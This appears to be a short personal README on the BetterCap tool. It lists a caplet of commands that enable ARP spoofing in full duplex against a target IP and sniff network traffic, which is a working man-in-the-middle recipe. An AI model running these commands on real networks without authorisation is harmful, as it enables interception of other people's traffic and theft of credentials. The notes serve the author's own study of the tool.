# BetterCap

<p align="center">
  <img alt="BetterCap" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" height="140" />
</p>

## To start with the program

<p align="center">
  bettercap iface <b>name_of_interface</b>
</p>

## spoof.cap

net.probe on
</br>set arp.spoof.fullduplex true
</br>set arp.spoof.target **target IP**
</br>arp.spoof on
</br>net.sniff on

## bettercap caplet

Copy the commands from <b>spoof.cap</b>, then edit it with the <b>target_IP</b> and save it in some directory with name "<i><b>spoof.cap</b></i>". Now, move to the particular directory and run the command below:
<p align="center"></br>bettercap -iface <b>name_of_interface</b> -caplet spoof.cap</p>

## Decleration

<p align="center">
  <i>I do not own this program/software/script. Neither I have the license to distributr/sell. This is for self understanding/remembering and easy access across systems for myself.</i>
</p>
